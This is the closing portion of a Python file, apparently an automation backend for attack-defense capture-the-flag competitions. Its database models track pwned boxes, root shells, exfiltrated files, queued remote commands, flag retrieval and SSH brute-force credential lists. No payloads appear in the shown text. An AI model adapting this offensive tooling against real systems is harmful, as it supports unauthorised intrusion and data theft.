    log("ssh_bruteforce", f"stdout: '{stdout}'")
    log("ssh_bruteforce", f"stderr: '{stderr}'")
    return stdout


def random_string(strings):
    result = ""
    for _ in range(5, 10):
        result += random.choice(strings) + "\n"
    return result


def random_characters():
    letter = random.choice(string.ascii_letters)
    return letter * random.randint(30, 150)


def random_binary():
    return os.urandom(random.randint(50, 200))


def log(type, message):
    # Add to database
    db.session.add(Log(type, datetime.now(), message))
    db.session.commit()

    # Write to log file
    with open(LOG_FILE, "a+") as f:
        f.write(f"[{type}] [{datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {message}\n")


def str_to_bool(s):
    if s == "True":
        return True
    elif s == "False":
        return False
    else:
        return None


# </editor-fold>

# <editor-fold desc="Objects">

class Log(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    type = db.Column(db.Text, nullable=False)
    datetime = db.Column(db.DateTime, nullable=False)
    message = db.Column(db.Text, nullable=False)

    def __init__(self, type, datetime, message):
        self.type = type
        self.datetime = datetime
        self.message = message


class Setting(db.Model):
    name = db.Column(db.Text, primary_key=True)
    value = db.Column(db.Text, nullable=False)
    description = db.Column(db.Text, nullable=False)

    def __init__(self, name, value, description):
        self.name = name
        self.value = value
        self.description = description


class Team(db.Model):
    num = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.Text, nullable=False)

    def __init__(self, num, name):
        self.num = num
        self.name = name


class Service(db.Model):
    ip = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.Integer, nullable=False)
    port = db.Column(db.Integer, nullable=False)
    ssh_port = db.Column(db.Integer, nullable=False)

    def __init__(self, ip, name, port, ssh_port):
        self.ip = ip
        self.name = name
        self.port = port
        self.ssh_port = ssh_port


class Box(db.Model):
    team_num = db.Column(db.Integer, db.ForeignKey("team.num"), primary_key=True)
    team = db.relationship(Team, backref=db.backref("boxes", cascade="all, delete-orphan"))
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), primary_key=True)
    service = db.relationship(Service, backref=db.backref("boxes", cascade="all, delete-orphan"))
    pwned = db.Column(db.Boolean, nullable=False)
    pwned_root = db.Column(db.Boolean, nullable=False)
    last_update = db.Column(db.DateTime, nullable=True)
    flags = db.Column(db.Boolean, nullable=False)
    last_flag = db.Column(db.DateTime, nullable=True)

    def __init__(self, team_num, service_ip, pwned, pwned_root, last_update, flags, last_flag):
        self.team_num = team_num
        self.service_ip = service_ip
        self.pwned = pwned
        self.pwned_root = pwned_root
        self.last_update = last_update
        self.flags = flags
        self.last_flag = last_flag


class Flag(db.Model):
    flag = db.Column(db.Text, primary_key=True)
    team_num = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
    team = db.relationship(Team, backref=db.backref("flags", cascade="all, delete-orphan"))
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("flags", cascade="all, delete-orphan"))
    source = db.Column(db.Text, nullable=False)
    found = db.Column(db.DateTime, nullable=False)
    submitted = db.Column(db.DateTime, nullable=True)

    def __init__(self, flag, team_num, service_ip, source, found, submitted):
        self.flag = flag
        self.team_num = team_num
        self.service_ip = service_ip
        self.source = source
        self.found = found
        self.submitted = submitted


class ExfilData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    team_num = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
    team = db.relationship(Team, backref=db.backref("exfil_data", cascade="all, delete-orphan"))
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("exfil_data", cascade="all, delete-orphan"))
    filename = db.Column(db.Text, nullable=False)
    data = db.Column(db.Text, nullable=False)
    found = db.Column(db.DateTime, nullable=False)

    def __init__(self, team_num, service_ip, filename, data, found):
        self.team_num = team_num
        self.service_ip = service_ip
        self.filename = filename
        self.data = data
        self.found = found


class Script(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("scripts", cascade="all, delete-orphan"))
    path = db.Column(db.Text, nullable=False)
    target_pwned = db.Column(db.Boolean, nullable=False)

    def __init__(self, service_ip, path, target_pwned):
        self.service_ip = service_ip
        self.path = path
        self.target_pwned = target_pwned


class FlagRetrieval(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("flag_retrievals", cascade="all, delete-orphan"))
    root_shell = db.Column(db.Boolean, nullable=False)
    command = db.Column(db.Text, nullable=False)

    def __init__(self, service_ip, root_shell, command):
        self.service_ip = service_ip
        self.root_shell = root_shell
        self.command = command


class QueuedCommand(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    team_num = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
    team = db.relationship(Team, backref=db.backref("queued_commands", cascade="all, delete-orphan"))
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    service = db.relationship(Service, backref=db.backref("queued_commands", cascade="all, delete-orphan"))
    root_shell = db.Column(db.Boolean, nullable=False)
    command = db.Column(db.Text, nullable=False)

    def __init__(self, team_num, service_ip, root_shell, command):
        self.team_num = team_num
        self.service_ip = service_ip
        self.root_shell = root_shell
        self.command = command


class SSHUsername(db.Model):
    username = db.Column(db.Text, primary_key=True)

    def __init__(self, username):
        self.username = username


class SSHPassword(db.Model):
    password = db.Column(db.Text, primary_key=True)

    def __init__(self, password):
        self.password = password


# </editor-fold>

if __name__ == "__main__":
    main()
